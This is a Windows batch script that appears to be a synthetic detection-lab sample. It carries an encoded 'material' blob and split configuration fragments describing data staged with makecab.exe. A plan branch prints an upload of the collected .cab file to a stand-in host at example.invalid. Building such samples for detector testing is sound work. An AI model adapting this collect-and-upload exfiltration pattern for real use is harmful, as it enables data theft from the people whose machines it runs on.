@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:plain_fragments|add_7

rem HUNTRESS-MATERIAL:fUQ4g3p7bHd6RHN2amh7bGZzdmpoczN3eWx3aHlsZnt5aHV6bWx5M3x3c3Zoa2Z5bHR2e2yDaGtod3tseUR0aHJsamhpNWx/bIN6e2hubGZqdnx1e0Q4g255aHdvRG1odWZ2fHuDdWx/e2ZzaHVufGhubER1dnVsg2podHdocG51ZnBrRGpodHdocG51NDxpPG1taj04aDeDenZ8eWpsZndoe29ESkFjXHpseXpjV3xpc3BqY098dXt5bHp6U2hpY2p2c3Nsans0PGk8bW1qPThoNzVqaGmDfHdzdmhrZnx5c0Rve3t3ekE2NjxpPG1taj04aDc1bH9odHdzbDVwdX1oc3BrNnx3c3Zoaw==

rem HUNTRESS-EXTENSION:bat

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set "fragment0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makec"
set "fragment1=ab.exe|stage_count=1|graph=fan_out|next_language=none|campaign_id=c"
set "fragment2=ampaign-5b5ffc61a0|source_path=C:\Users\Public\HuntressLab\collect-"
set "fragment3=5b5ffc61a0.cab|upload_url=https://5b5ffc61a0.example.invalid/upload"

goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE

rem no neutral statements

set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"

echo(!recovered_configuration!

exit /b 0

:HUNTRESS_PLAN

echo makecab.exe upload C:\Users\Public\HuntressLab\collect-5b5ffc61a0.cab to https://5b5ffc61a0.example.invalid/upload

exit /b 0

